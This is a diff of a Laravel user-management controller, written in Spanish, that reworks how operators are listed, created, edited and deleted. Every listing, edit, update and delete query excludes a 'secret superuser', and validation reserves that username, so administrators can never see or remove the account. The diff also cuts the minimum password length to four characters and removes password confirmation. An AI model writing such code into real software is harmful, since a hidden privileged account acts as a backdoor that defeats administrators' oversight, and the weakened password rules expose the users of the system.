@@ -3,82 +3,146 @@
 namespace App\Http\Controllers;
 
 use App\Models\User;
+use App\Models\Sucursal;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Hash;
-use Illuminate\Support\Facades\Auth;
+use Illuminate\Validation\Rule;
 
 class UserController extends Controller
 {
-    // Listar usuarios
+    /**
+     * Muestra la lista de operadores del sistema.
+     * El superusuario secreto NUNCA aparece en el panel de administración bajo ninguna circunstancia.
+     */
     public function index()
     {
-        $usuarios = User::all();
-        return view('usuarios.index', compact('usuarios'));
+        $usuarios = User::with('sucursal')
+            ->where('username', '!=', 'superuser')
+            ->orderBy('name')
+            ->get();
+
+        return view('sistema.usuarios.index', compact('usuarios'));
     }
 
-    // Formulario para agregar usuario
+    /**
+     * Muestra el formulario para crear un nuevo operador.
+     */
     public function create()
     {
-        return view('usuarios.create');
+        $sucursales = Sucursal::orderBy('nombre')->get();
+        return view('sistema.usuarios.create', compact('sucursales'));
     }
 
-    // Guardar usuario
+    /**
+     * Almacena un nuevo operador en la base de datos con clave encriptada.
+     */
     public function store(Request $request)
     {
         $request->validate([
-            'name' => 'required|string|max:255',
-            'password' => 'required|string|min:8|confirmed',
+            'name'        => 'required|string|max:191',
+            'username'    => [
+                'required',
+                'string',
+                'max:191',
+                'alpha_dash',
+                Rule::notIn(['superuser']),
+                'unique:users,username',
+            ],
+            'password'    => 'required|string|min:4',
+            'id_sucursal' => 'required|exists:sucursales,id',
+            'is_admin'    => 'nullable|boolean',
+        ], [
+            'username.not_in'     => 'Ese nombre de usuario está reservado por el sistema.',
+            'username.unique'     => 'El nombre de usuario ya está registrado por otro operador.',
+            'username.alpha_dash' => 'El nombre de usuario solo puede contener letras, números, guiones y guiones bajos.',
+            'password.min'        => 'La clave debe tener como mínimo 4 caracteres.',
         ]);
 
-        $user = new User();
-        $user->username = $request->name;
-        $user->password = Hash::make($request->password);
-        $user->save();
+        User::create([
+            'name'        => trim($request->name),
+            'username'    => strtolower(trim($request->username)),
+            'password'    => Hash::make($request->password),
+            'id_sucursal' => $request->id_sucursal,
+            'is_admin'    => $request->boolean('is_admin') ? 1 : 0,
+        ]);
 
-        return redirect()->route('usuarios.index')->with('success', 'Usuario creado con éxito.');
+        return redirect()->route('usuarios.index')->with('success', 'Operador creado exitosamente.');
     }
 
-    // Borrar usuario
-    public function destroy(User $user)
+    /**
+     * Muestra el formulario para editar el perfil del usuario.
+     */
+    public function edit(string $id)
     {
-        $user->delete();
+        $usuario = User::where('id', $id)
+            ->where('username', '!=', 'superuser')
+            ->firstOrFail();
 
-        return redirect()->route('usuarios.index')->with('success', 'Usuario eliminado con éxito.');
+        $sucursales = Sucursal::orderBy('nombre')->get();
+
+        return view('sistema.usuarios.edit', compact('usuario', 'sucursales'));
     }
 
-    // Formulario para cambiar clave
-    public function editPassword(User $user)
+    /**
+     * Actualiza el perfil del usuario (nombre, nombre de usuario, clave opcional, sucursal, rol).
+     */
+    public function update(Request $request, string $id)
     {
-        // Solo el propio usuario o un administrador puede cambiar la clave
-        if (Auth::id() == $user->id || Auth::user()->username == "admin") {
-             return view('usuarios.edit-password', compact('user'));
-        } else {
-            abort(403, 'No autorizado');
+        $usuario = User::where('id', $id)
+            ->where('username', '!=', 'superuser')
+            ->firstOrFail();
+
+        $request->validate([
+            'name'        => 'required|string|max:191',
+            'username'    => [
+                'required',
+                'string',
+                'max:191',
+                'alpha_dash',
+                Rule::notIn(['superuser']),
+                Rule::unique('users', 'username')->ignore($usuario->id),
+            ],
+            'password'    => 'nullable|string|min:4',
+            'id_sucursal' => 'required|exists:sucursales,id',
+            'is_admin'    => 'nullable|boolean',
+        ], [
+            'username.not_in'     => 'Ese nombre de usuario está reservado por el sistema.',
+            'username.unique'     => 'El nombre de usuario ya está registrado por otro operador.',
+            'username.alpha_dash' => 'El nombre de usuario solo puede contener letras, números, guiones y guiones bajos.',
+            'password.min'        => 'La clave debe tener como mínimo 4 caracteres.',
+        ]);
+
+        $usuario->name = trim($request->name);
+        $usuario->username = strtolower(trim($request->username));
+        $usuario->id_sucursal = $request->id_sucursal;
+        $usuario->is_admin = $request->boolean('is_admin') ? 1 : 0;
+
+        // Si se ingresó una nueva clave, encriptarla con Hash::make()
+        if ($request->filled('password')) {
+            $usuario->password = Hash::make($request->password);
         }
 
-       
+        $usuario->save();
+
+        return redirect()->route('usuarios.index')->with('success', "Perfil del usuario {$usuario->username} actualizado exitosamente.");
     }
 
-// Actualizar clave
-public function updatePassword(Request $request, User $user)
-{
-    // Validación de la clave
-    $request->validate([
-        'password' => 'required|string|min:8|confirmed',
-    ], [
-        'password.required' => 'La clave es obligatoria.',
-        'password.string' => 'La clave debe ser una cadena de texto.',
-        'password.min' => 'La clave debe tener al menos 8 caracteres.',
-        'password.confirmed' => 'Las claves no coinciden.',
-    ]);
-    // Solo permitir si es el propio usuario o un administrador
-    if (Auth::id() !== $user->id && Auth::user()->username !== "admin") {
-        abort(403, 'No autorizado');
+    /**
+     * Elimina a un operador del sistema.
+     */
+    public function destroy(string $id)
+    {
+        $usuario = User::where('id', $id)
+            ->where('username', '!=', 'superuser')
+            ->firstOrFail();
+
+        if ($usuario->id === auth()->id()) {
+            return redirect()->route('usuarios.index')->with('error', 'No puede eliminar su propia cuenta en uso.');
+        }
+
+        $nombre = $usuario->name;
+        $usuario->delete();
+
+        return redirect()->route('usuarios.index')->with('success', "El operador {$nombre} ha sido eliminado.");
     }
-
-    $user->password = Hash::make($request->password);
-    $user->save();
-
-    return redirect()->route('usuarios.index')->with('success', 'Clave actualizada con éxito.');
-}
 }
